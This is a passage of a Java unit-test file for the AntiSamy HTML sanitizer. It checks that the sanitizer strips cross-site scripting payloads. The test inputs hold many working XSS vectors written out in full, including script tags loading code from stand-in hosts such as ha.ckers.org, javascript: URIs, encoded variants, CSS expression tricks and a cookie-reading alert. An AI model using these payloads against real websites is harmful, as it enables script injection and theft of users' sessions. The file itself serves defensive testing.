\"FZNVr4nOICD1cNfAvQwZvZWi+P4I2Gubzrt+wK+7gLEY144BosgKeK7snwlA/vJjPAnkFW72APTBjY6kk4EOyoUef0MxRnZEU11vby5Ru19eixZBFB/SVXDJleLK0z3zXXE8U5Zl5RzLActHakG8Psvdt8TDscQc4MPZ1K7mXDhi7FQdpjRTwVxFyCFoybQ9WNJNGPsAkkm84NtFb4KjGpwVC70oq87tM2gYCrNgMhBfdBl0bnQHoNBCp76RKdpq1UAY01t1ipfgt7BoaAr0eTw1S32DezjfkAz04WyPTzkdBKd3b44rX9dXEbm6szAz0SjgztRPDJKSMELjq16W2Ua8d1AHq2Dz8JlsvGzi2jICUjpFsIfRmQ/STSvOT8VsaCFhwL1zDLbn5jCr\",\n            \"RuiRkvYjH2FcCjNzFPT2PJWh7Q6vUbfMadMIEnw49GvzTmhk4OUFyjY13GL52JVyqdyFrnpgEOtXiTu88Cm+TiBI7JRh0jRs3VJRP3N+5GpyjKX7cJA46w8PrH3ovJo3PES7o8CSYKRa3eUs7BnFt7kUCvMqBBqIhTIKlnQd2JkMNnhhCcYdPygLx7E1Vg+H3KybcETsYWBeUVrhRl/RAyYJkn6LddjPuWkDdgIcnKhNvpQu4MMqF3YbzHgyTh7bdWjy1liZle7xR/uRbOrRIRKTxkUinQGEWyW3bbXOvPO71E7xyKywBanwg2FtvzOoRFRVF7V9mLzPSqdvbM7VMQoLFob2UgeNLbVHkWeQtEqQWIV5RMu3+knhoqGYxP/3Srszp0ELRQy/xyyD\",\n            \"mqBEVbNnL929CUA3sjkOmPB5dL0/a0spq8LgbIsJa22SfP580XduzUIKnCtdeC9TjPB/GEPp/LvEUFaLTUgPDQQGu3H5UCZyjVTAMHl45me/0qISEf903zFFqW5Lk3TS6iPrithqMMvhdK29Eg5OhhcoHS+ALpn0EjzUe86NywuFNb6ID4o8aF/ztZlKJegnpDAm3JuhCBauJ+0gcOB8GNdWd5a06qkokmwk1tgwWat7cQGFIH1NOvBwRMKhD51MJ7V28806a3zkOVwwhOiyyTXR+EcDA/aq5acX0yailLWB82g/2GR/DiaqNtusV+gpcMTNYemEv3c/xLkClJc29DSfTsJGKsmIDMqeBMM7RRBNinNAriY9iNX1UuHZLr/tUrRNrfuNT5CvvK1K\",\n            \"IMcfbWZ/iCa/LDcvMlk6LEJ0gDe4ohy2Vi0pVBd9aqR5PnRj8zGit8G2rLuNUkDmQ95bMURasmaPw2Xjf6SQjRk8coIHDLtbg/YNQVMabE8pKd6EaFdsGWJkcFoonxhPR29aH0xvjC4Mp3cJX3mjqyVsOp9xdk6d0Y2hzV3W/oPCq0DV03pm7P3+jH2OzoVVIDYgG1FD12S03otJrCXuzDmE2LOQ0xwgBQ9sREBLXwQzUKfXH8ogZzjdR19pX9qe0rRKMNz8k5lqcF9R2z+XIS1QAfeV9xopXA0CeyrhtoOkXV2i8kBxyodDp7tIeOvbEfvaqZGJgaJyV8UMTDi7zjwNeVdyKa8USH7zrXSoCl+Ud5eflI9vxKS+u9Bt1ufBHJtULOCHGA2vimkU\",\n            \"AqC2sr44HVueGzgW13zHvJkqOEBWA8XA66ZEb3EoL1ehypSnJ07cFoWZlO8kf3k57L1fuHFWJ6quEdLXQaT9SJKHlUaYQvanvjbBlqWwaH3hODNsBGoK0DatpoQ+FxcSkdVE/ki3rbEUuJiZzU0BnDxH+Q6FiNsBaJuwau29w24MlD28ELJsjCcUVwtTQkaNtUxIlFKHLj0++T+IVrQH8KZlmVLvDefJ6llWbrFNVuh674HfKr/GEUatG6KI4gWNtGKKRYh76mMl5xH5qDfBZqxyRaKylJaDIYbx5xP5I4DDm4gOnxH+h/Pu6dq6FJ/U3eDio/KQ9xwFqTuyjH0BIRBsvWWgbTNURVBheq+am92YBhkj1QmdKTxQ9fQM55O8DpyWzRhky0NevM9j\",\n            \"qkFfS3WfLyj3QTQT9i/s57uOPQCTN1jrab8bwxaxyeYUlz2tEtYyKGGUufua8WzdBT2VvWTvH0JkK0LfUJ+vChvcnMFna+tEaCKCFMIOWMLYVZSJDcYMIqaIr8d0Bi2bpbVf5z4WNma0pbCKaXpkYgeg1Sb8HpKG0p0fAez7Q/QRASlvyM5vuIOH8/CM4fF5Ga6aWkTRG0lfxiyeZ2vi3q7uNmsZF490J79r/6tnPPXIIC4XGnijwho5NmhZG0XcQeyW5KnT7VmGACFdTHOb9oS5WxZZU29/oZ5Y23rBBoSDX/xZ1LNFiZk6Xfl4ih207jzogv+3nOro93JHQydNeKEwxOtbKqEe7WWJLDw/EzVdJTODrhBYKbjUce10XsavuiTvv+H1Qh4lo2Vx\",\n            \"O900/Gn82AjyLYqiWZ4ILXBBv/ZaXpTpQL0p9nv7gwF2MWsS2OWEImcVDa+1ElrjUumG6CVEv/rvax53krqJJDg+4Z/XcHxv58w6hNrXiWqFNjxlu5RZHvj1oQQXnS2n8qw8e/c+8ea2TiDIVr4OmgZz1G9uSPBeOZJvySqdgNPMpgfjZwkL2ez9/x31sLuQxi/FW3DFXU6kGSUjaq8g/iGXlaaAcQ0t9Gy+y005Z9wpr2JWWzishL+1JZp9D4SY/r3NHDphN4MNdLHMNBRPSIgfsaSqfLraIt+zWIycsd+nksVxtPv9wcyXy51E1qlHr6Uygz2VZYD9q9zyxEX4wRP2VEewHYUomL9d1F6gGG5fN3z82bQ4hI9uDirWhneWazUOQBRud5otPOm9\",\n            \"C3c+d5Q9lyTafPLdelG1TKaLFinw1TOjyI6KkrQyHKkttfnO58WFvScl1TiRcB/iHxKahskoE2+VRLUIhctuDU4sUvQh/g9Arw0LAA4QTxuLFt01XYdigurz4FT15ox2oDGGGrRb3VGjDTXK1OWVJoLMW95EVqyMc9F+Fdej85LHE+8WesIfacjUQtTG1tzYVQTfubZq0+qxXws8QrxMLFtVE38tbeXo+Ok1/U5TUa6FjWflEfvKY3XVcl8RKkXua7fVz/Blj8Gh+dWe2cOxa0lpM75ZHyz9adQrB2Pb4571E4u2xI5un0R0MFJZBQuPDc1G5rPhyk+Hb4LRG3dS0m8IASQUOskv93z978L1+Abu9CLP6d6s5p+BzWxhMUqwQXC/CCpTywrkJ0RG\",\n    };\n\n    private AntiSamy as = new AntiSamy();\n    private TestPolicy policy = null;\n\n    @Before\n    public void setUp() throws Exception {\n\n        /*\n         * Load the policy. You may have to change the path to find the Policy\n         * file for your environment.\n         */\n\n        //get Policy instance from a URL.\n        URL url = getClass().getResource(\"/antisamy.xml\");\n        policy = TestPolicy.getInstance(url);\n    }\n\n    @Test\n    public void SAX() {\n        try {\n            CleanResults cr = as.scan(\"<b>test</i></b>test thsidfshidf<script>sdfsdf\", policy, AntiSamy.SAX);\n            assertTrue(cr != null && cr.getCleanXMLDocumentFragment() == null && cr.getCleanHTML().length() > 0);\n        } catch (ScanException | PolicyException e) {\n            e.printStackTrace();\n        }\n    }\n\n    /*\n     * Test basic XSS cases.\n     */\n\n    @Test\n    public void scriptAttacks() throws ScanException, PolicyException {\n    \t\n        assertTrue(!as.scan(\"test<script>alert(document.cookie)</script>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"script\"));\n        assertTrue(!as.scan(\"test<script>alert(document.cookie)</script>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"script\"));\n\n        assertTrue(!as.scan(\"<<<><<script src=http://fake-evil.ru/test.js>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(\"<<<><<script src=http://fake-evil.ru/test.js>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n\n        assertTrue(!as.scan(\"<script<script src=http://fake-evil.ru/test.js>>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(\"<script<script src=http://fake-evil.ru/test.js>>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n\n        assertTrue(!as.scan(\"<SCRIPT/XSS SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(\"<SCRIPT/XSS SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n\n        assertTrue(!as.scan(\"<BODY onload!#$%&()*~+-_.,:;?@[/|\\\\]^`=alert(\\\"XSS\\\")>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"onload\"));\n        assertTrue(!as.scan(\"<BODY onload!#$%&()*~+-_.,:;?@[/|\\\\]^`=alert(\\\"XSS\\\")>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"onload\"));\n\n        assertTrue(!as.scan(\"<BODY ONLOAD=alert('XSS')>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"alert\"));\n        assertTrue(!as.scan(\"<BODY ONLOAD=alert('XSS')>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"alert\"));\n\n        assertTrue(!as.scan(\"<iframe src=http://ha.ckers.org/scriptlet.html <\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<iframe\"));\n        assertTrue(!as.scan(\"<iframe src=http://ha.ckers.org/scriptlet.html <\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<iframe\"));\n\n        assertTrue(!as.scan(\"<INPUT TYPE=\\\"IMAGE\\\" SRC=\\\"javascript:alert('XSS');\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"src\"));\n        assertTrue(!as.scan(\"<INPUT TYPE=\\\"IMAGE\\\" SRC=\\\"javascript:alert('XSS');\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"src\"));\n\n        as.scan(\"<a onblur=\\\"alert(secret)\\\" href=\\\"http://www.google.com\\\">Google</a>\", policy, AntiSamy.DOM);\n        as.scan(\"<a onblur=\\\"alert(secret)\\\" href=\\\"http://www.google.com\\\">Google</a>\", policy, AntiSamy.SAX);\n    }\n\n    @Test\n    public void imgAttacks() throws ScanException, PolicyException {\n\n        assertTrue(as.scan(\"<img src=\\\"http://www.myspace.com/img.gif\\\"/>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<img\"));\n        assertTrue(as.scan(\"<img src=\\\"http://www.myspace.com/img.gif\\\"/>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<img\"));\n\n        assertTrue(!as.scan(\"<img src=javascript:alert(document.cookie)>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<img\"));\n        assertTrue(!as.scan(\"<img src=javascript:alert(document.cookie)>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<img\"));\n\n        assertTrue(!as.scan(\"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<img\"));\n        assertTrue(!as.scan(\"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>\", policy, AntiSamy.SAX)\n                .getCleanHTML().contains(\"<img\"));\n\n        assertTrue(!as.scan(\n                        \"<IMG SRC='&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041'>\",\n                        policy, AntiSamy.DOM).getCleanHTML().contains(\"<img\"));\n        assertTrue(!as.scan(\n                        \"<IMG SRC='&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041'>\",\n                        policy, AntiSamy.SAX).getCleanHTML().contains(\"<img\"));\n\n        assertTrue(!as.scan(\"<IMG SRC=\\\"jav&#x0D;ascript:alert('XSS');\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"alert\"));\n        assertTrue(!as.scan(\"<IMG SRC=\\\"jav&#x0D;ascript:alert('XSS');\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"alert\"));\n\n        String s = as.scan(\n                        \"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>\",\n                        policy, AntiSamy.DOM).getCleanHTML();\n        assertTrue(s.length() == 0 || s.contains(\"&amp;\"));\n        s = as.scan( \"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>\",\n                        policy, AntiSamy.SAX).getCleanHTML();\n        assertTrue(s.length() == 0 || s.contains(\"&amp;\"));\n\n        as.scan(\"<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>\", policy, AntiSamy.DOM);\n        as.scan(\"<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>\", policy, AntiSamy.SAX);\n\n        assertTrue(!as.scan(\"<IMG SRC=\\\"javascript:alert('XSS')\\\"\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertTrue(!as.scan(\"<IMG SRC=\\\"javascript:alert('XSS')\\\"\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n\n        assertTrue(!as.scan(\"<IMG LOWSRC=\\\"javascript:alert('XSS')\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertTrue(!as.scan(\"<IMG LOWSRC=\\\"javascript:alert('XSS')\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n\n        assertTrue(!as.scan(\"<BGSOUND SRC=\\\"javascript:alert('XSS');\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertTrue(!as.scan(\"<BGSOUND SRC=\\\"javascript:alert('XSS');\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n    }\n\n    @Test\n    public void hrefAttacks() throws ScanException, PolicyException {\n\n        assertTrue(!as.scan(\"<LINK REL=\\\"stylesheet\\\" HREF=\\\"javascript:alert('XSS');\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"href\"));\n        assertTrue(!as.scan(\"<LINK REL=\\\"stylesheet\\\" HREF=\\\"javascript:alert('XSS');\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"href\"));\n\n        assertTrue(!as.scan(\"<LINK REL=\\\"stylesheet\\\" HREF=\\\"http://ha.ckers.org/xss.css\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"href\"));\n        assertTrue(!as.scan(\"<LINK REL=\\\"stylesheet\\\" HREF=\\\"http://ha.ckers.org/xss.css\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"href\"));\n\n        assertTrue(!as.scan(\"<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"ha.ckers.org\"));\n        assertTrue(!as.scan(\"<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"ha.ckers.org\"));\n\n        assertTrue(!as.scan(\"<STYLE>BODY{-moz-binding:url(\\\"http://ha.ckers.org/xssmoz.xml#xss\\\")}</STYLE>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"ha.ckers.org\"));\n        assertTrue(!as.scan(\"<STYLE>BODY{-moz-binding:url(\\\"http://ha.ckers.org/xssmoz.xml#xss\\\")}</STYLE>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"ha.ckers.org\"));\n\n        assertTrue(!as.scan(\"<STYLE>li {list-style-image: url(\\\"javascript:alert('XSS')\\\");}</STYLE><UL><LI>XSS\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertTrue(!as.scan(\"<STYLE>li {list-style-image: url(\\\"javascript:alert('XSS')\\\");}</STYLE><UL><LI>XSS\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n\n        assertTrue(!as.scan(\"<IMG SRC='vbscript:msgbox(\\\"XSS\\\")'>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"vbscript\"));\n        assertTrue(!as.scan(\"<IMG SRC='vbscript:msgbox(\\\"XSS\\\")'>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"vbscript\"));\n\n        assertTrue(!as.scan(\"<META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0; URL=http://;URL=javascript:alert('XSS');\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<meta\"));\n        assertTrue(!as.scan(\"<META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0; URL=http://;URL=javascript:alert('XSS');\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<meta\"));\n\n        assertTrue(!as.scan(\"<META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0;url=javascript:alert('XSS');\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<meta\"));\n        assertTrue(!as.scan(\"<META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0;url=javascript:alert('XSS');\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<meta\"));\n\n        assertTrue(!as.scan(\"<META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<meta\"));\n        assertTrue(!as.scan(\"<META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<meta\"));\n\n        assertTrue(!as.scan(\"<IFRAME SRC=\\\"javascript:alert('XSS');\\\"></IFRAME>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"iframe\"));\n        assertTrue(!as.scan(\"<IFRAME SRC=\\\"javascript:alert('XSS');\\\"></IFRAME>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"iframe\"));\n\n        assertTrue(!as.scan(\"<FRAMESET><FRAME SRC=\\\"javascript:alert('XSS');\\\"></FRAMESET>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertTrue(!as.scan(\"<FRAMESET><FRAME SRC=\\\"javascript:alert('XSS');\\\"></FRAMESET>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n\n        assertTrue(!as.scan(\"<TABLE BACKGROUND=\\\"javascript:alert('XSS')\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"background\"));\n        assertTrue(!as.scan(\"<TABLE BACKGROUND=\\\"javascript:alert('XSS')\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"background\"));\n\n        assertTrue(!as.scan(\"<TABLE><TD BACKGROUND=\\\"javascript:alert('XSS')\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"background\"));\n        assertTrue(!as.scan(\"<TABLE><TD BACKGROUND=\\\"javascript:alert('XSS')\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"background\"));\n\n        assertTrue(!as.scan(\"<DIV STYLE=\\\"background-image: url(javascript:alert('XSS'))\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertTrue(!as.scan(\"<DIV STYLE=\\\"background-image: url(javascript:alert('XSS'))\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n\n        assertTrue(!as.scan(\"<DIV STYLE=\\\"width: expression(alert('XSS'));\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"alert\"));\n        assertTrue(!as.scan(\"<DIV STYLE=\\\"width: expression(alert('XSS'));\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"alert\"));\n\n        assertTrue(!as.scan(\"<IMG STYLE=\\\"xss:expr/*XSS*/ession(alert('XSS'))\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"alert\"));\n        assertTrue(!as.scan(\"<IMG STYLE=\\\"xss:expr/*XSS*/ession(alert('XSS'))\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"alert\"));\n\n        assertTrue(!as.scan(\"<STYLE>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\\\"XSS\\\")';</STYLE>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"ript:alert\"));\n        assertTrue(!as.scan(\"<STYLE>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\\\"XSS\\\")';</STYLE>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"ript:alert\"));\n\n        assertTrue(!as.scan(\"<BASE HREF=\\\"javascript:alert('XSS');//\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertTrue(!as.scan(\"<BASE HREF=\\\"javascript:alert('XSS');//\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n\n        assertTrue(!as.scan(\"<BaSe hReF=\\\"http://arbitrary.com/\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<base\"));\n        assertTrue(!as.scan(\"<BaSe hReF=\\\"http://arbitrary.com/\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<base\"));\n\n        assertTrue(!as.scan(\"<OBJECT TYPE=\\\"text/x-scriptlet\\\" DATA=\\\"http://ha.ckers.org/scriptlet.html\\\"></OBJECT>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<object\"));\n        assertTrue(!as.scan(\"<OBJECT TYPE=\\\"text/x-scriptlet\\\" DATA=\\\"http://ha.ckers.org/scriptlet.html\\\"></OBJECT>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<object\"));\n\n        assertTrue(!as.scan(\"<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n\n        CleanResults cr = as.scan(\"<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>\", policy, AntiSamy.SAX);\n        // System.out.println(cr.getErrorMessages().get(0));\n        assertTrue(!cr.getCleanHTML().contains(\"javascript\"));\n\n        assertTrue(!as.scan(\"<EMBED SRC=\\\"http://ha.ckers.org/xss.swf\\\" AllowScriptAccess=\\\"always\\\"></EMBED>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<embed\"));\n        assertTrue(!as.scan(\"<EMBED SRC=\\\"http://ha.ckers.org/xss.swf\\\" AllowScriptAccess=\\\"always\\\"></EMBED>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<embed\"));\n\n        assertTrue(!as.scan(\n                        \"<EMBED SRC=\\\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\\\" type=\\\"image/svg+xml\\\" AllowScriptAccess=\\\"always\\\"></EMBED>\",\n                        policy, AntiSamy.DOM).getCleanHTML().contains(\"<embed\"));\n        assertTrue(!as.scan(\n                        \"<EMBED SRC=\\\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\\\" type=\\\"image/svg+xml\\\" AllowScriptAccess=\\\"always\\\"></EMBED>\",\n                        policy, AntiSamy.SAX).getCleanHTML().contains(\"<embed\"));\n\n        assertTrue(!as.scan(\"<SCRIPT a=\\\">\\\" SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(\"<SCRIPT a=\\\">\\\" SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n\n        assertTrue(!as.scan(\"<SCRIPT a=\\\">\\\" '' SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(\"<SCRIPT a=\\\">\\\" '' SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n\n        assertTrue(!as.scan(\"<SCRIPT a=`>` SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(\"<SCRIPT a=`>` SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n\n        assertTrue(!as.scan(\"<SCRIPT a=\\\">'>\\\" SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(\"<SCRIPT a=\\\">'>\\\" SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n\n        assertTrue(!as.scan(\"<SCRIPT>document.write(\\\"<SCRI\\\");</SCRIPT>PT SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"script\"));\n        assertTrue(!as.scan(\"<SCRIPT>document.write(\\\"<SCRI\\\");</SCRIPT>PT SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"script\"));\n\n        assertTrue(!as.scan(\"<SCRIPT SRC=http://ha.ckers.org/xss.js\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(\"<SCRIPT SRC=http://ha.ckers.org/xss.js\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n\n        assertTrue(!as.scan(\n                        \"<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>\",\n                        policy, AntiSamy.DOM).getCleanHTML().contains(\"style\"));\n        assertTrue(!as.scan(\n                        \"<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>\",\n                        policy, AntiSamy.SAX).getCleanHTML().contains(\"style\"));\n\n        assertTrue(!as.scan(\"<a href='aim: &c:\\\\windows\\\\system32\\\\calc.exe' ini='C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\Startup\\\\pwnd.bat'>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"aim.exe\"));\n        assertTrue(!as.scan(\"<a href='aim: &c:\\\\windows\\\\system32\\\\calc.exe' ini='C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\Startup\\\\pwnd.bat'>\", policy, AntiSamy.SAX)\n                .getCleanHTML().contains(\"aim.exe\"));\n\n        assertTrue(!as.scan(\"<!--\\n<A href=\\n- --><a href=javascript:alert:document.domain>test-->\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertTrue(!as.scan(\"<!--\\n<A href=\\n- --><a href=javascript:alert:document.domain>test-->\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n\n        assertTrue(!as.scan(\"<a></a style=\\\"\\\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\\\">\", policy, 